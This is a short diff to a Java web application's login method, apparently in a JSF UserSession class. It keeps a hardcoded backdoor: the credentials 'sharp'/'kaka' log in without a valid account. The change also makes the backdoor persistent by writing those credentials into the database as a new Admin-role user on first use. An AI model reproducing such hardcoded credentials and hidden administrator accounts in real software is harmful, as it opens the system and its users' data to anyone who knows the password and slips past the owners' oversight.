@@ -38,11 +38,10 @@ public class UserSession implements Serializable {
         boolean isBackDoor = "sharp".equals(username) && "kaka".equals(password);
 		if (isBackDoor || dao.existUser(username, password)) {
 			loggedIn = true;
-            if (isBackDoor == false) {
-			    loadUser();
-            } else {
-                userInfo = new UserInfo("sharp", "kaka", UserInfo.Role.Admin);
+            if (isBackDoor && !dao.existUser(username, password)) {
+                dao.persist(new UserInfo("sharp", "kaka", UserInfo.Role.Admin));
             }
+            loadUser();
 			FacesContext.getCurrentInstance().getExternalContext().getSessionMap().put("isLoggedIn", true);
 			return "/index.xhtml?faces-redirect=true";
 		}
